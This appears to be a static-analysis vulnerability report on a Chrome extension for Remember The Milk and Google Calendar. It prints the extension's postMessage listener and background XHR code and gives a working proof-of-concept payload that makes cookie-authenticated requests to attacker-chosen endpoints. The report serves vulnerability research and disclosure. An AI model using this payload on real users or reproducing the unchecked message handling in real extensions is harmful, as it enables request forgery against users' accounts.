# CoCo Analysis: hphjpfmagbhbdfhdndglcccmhdjhjjce

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 8 (4 XMLHttpRequest_url_sink + 4 XMLHttpRequest_post_sink, representing the same vulnerability with different parameter variations)

---

## Sink: cs_window_eventListener_message → XMLHttpRequest_url_sink / XMLHttpRequest_post_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hphjpfmagbhbdfhdndglcccmhdjhjjce/opgen_generated_files/cs_0.js
Line 468	  function g(b) {
Line 470	      if (b && b.data) {
Line 471	        var a = JSON.parse(b.data);
Line 474	            name: a.RTMLoader.id
Line 482	          e.postMessage(a.RTMLoader.data);

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hphjpfmagbhbdfhdndglcccmhdjhjjce/opgen_generated_files/bg.js
Line 965	function RTMLoader(){}RTMLoader.onPortConnect=function(h){var e=function(a,c){c.onMessage.removeListener(e);RTMLoader.request(c,a.path,a.params,a.use_post,a.no_eval,a.get_as_post,a.gauth,a.rauth,a.id)};h.onMessage.addListener(e)};
Line 966	RTMLoader.request=function(h,e,a,c,i,j,n,o,k){var b=new XMLHttpRequest,f=[];for(var l in a)f.push(encodeURIComponent(l)+"="+encodeURIComponent(a[l]));f=f.join("&");c=!!c;var g=e+(!c?"?"+f:"");e=c||j?"POST":"GET";...

**Code:**

```javascript
// Content script - postMessage listener (cs_0.js line 467-483)
(function() {
  function g(b) {
    try {
      if (b && b.data) {
        var a = JSON.parse(b.data);  // ← attacker-controlled message data
        if ('RTMLoader' in a) {
          var e = chrome.extension.connect({
            name: a.RTMLoader.id  // ← attacker-controlled
          });
          e.onMessage.addListener(function(h) {
            var c = window.top.document.createElement('script');
            c.setAttribute('id', 'rtm-resp-' + a.RTMLoader.id);
            c.innerText = 'RTM.handleLoader(' + JSON.stringify(h) + ');';
            window.top.document.body.appendChild(c);
          });
          e.postMessage(a.RTMLoader.data);  // ← attacker-controlled path/params sent to background
        }
      }
    } catch(err) {}
  }
  window.addEventListener('message', g, false);  // ← DOM postMessage listener
})();

// Background script - Port message handler (bg.js lines 965-968)
function RTMLoader(){}

RTMLoader.onPortConnect=function(h){
  var e=function(a,c){
    c.onMessage.removeListener(e);
    RTMLoader.request(c, a.path, a.params, a.use_post, a.no_eval, a.get_as_post, a.gauth, a.rauth, a.id);
    //                   ^^^^^^  ^^^^^^^^  ← attacker controls these
  };
  h.onMessage.addListener(e)
};

RTMLoader.request=function(h, e, a, c, i, j, n, o, k){
  var b=new XMLHttpRequest, f=[];
  for(var l in a) f.push(encodeURIComponent(l)+"="+encodeURIComponent(a[l]));
  f=f.join("&");
  c=!!c;
  var g=e+(!c?"?"+f:"");  // ← URL constructed from attacker-controlled path and params
  e=c||j?"POST":"GET";

  b.onreadystatechange=function(){
    if(b.readyState===4){
      var d=-1;
      try{d=b.status}catch(p){}
      if(d!==200) h.postMessage({type:"xhr",url:g,status:"fail",id:k});
      else{
        d=b.responseText;
        i||(d=d.substring(9));
        var m=null;
        try{m=!i?JSON.parse(d):d}catch(q){}
        h.postMessage({type:"xhr",url:g,status:"ok",obj:m,id:k})
      }
    }
  };

  a=null;
  // Check if URL contains whitelisted domains
  if(g.indexOf("google.com")>-1) a=n;
  else if(g.indexOf("rememberthemilk.com")>-1) a=o;

  try{
    b.open(e, g, true);  // ← XHR to attacker-controlled URL (restricted to whitelisted domains)
    if(c){
      b.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
      a!==null&&b.setRequestHeader("Cookie",a);
      b.send(f)
    }else if(j){
      b.setRequestHeader("Content-Type","application/x-www-form-urlencoded;charset=utf-8");
      b.setRequestHeader("Content-Length","0");
      a!==null&&b.setRequestHeader("Cookie",a);
      b.send(f)
    }else{
      a!==null&&b.setRequestHeader("Cookie",a);
      b.send(null)
    }
  }catch(r){}
};

chrome.extension.onConnect.addListener(RTMLoader.onPortConnect);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event listener)

**Attack:**

```javascript
// From any webpage (per methodology, we ignore manifest content_scripts "matches" restrictions):
window.postMessage(JSON.stringify({
  RTMLoader: {
    id: "exploit",
    data: {
      path: "https://www.google.com/calendar/feeds/malicious/endpoint",  // Attacker controls specific endpoint
      params: {
        evil: "payload",        // Attacker controls all query parameters
        sensitive: "data"
      },
      use_post: true,            // Attacker can force POST method
      no_eval: false,
      get_as_post: false,
      id: "attack123"
    }
  }
}), "*");
```

**Impact:** Server-Side Request Forgery (SSRF) with privileged extension permissions. The attacker can make authenticated XHR requests to arbitrary endpoints within whitelisted domains (google.com/calendar/feeds/*, rememberthemilk.com/*) with attacker-controlled paths, query parameters, and POST data. While the extension code checks if the URL contains "google.com" or "rememberthemilk.com" (matching the extension's permissions), the attacker still controls:
1. The specific endpoint/path within those domains
2. All query parameters and POST data
3. The HTTP method (GET/POST)

This allows the attacker to make privileged cross-origin requests to sensitive endpoints within those domains with the extension's authentication cookies, potentially accessing or modifying user data on Google Calendar or Remember The Milk services.
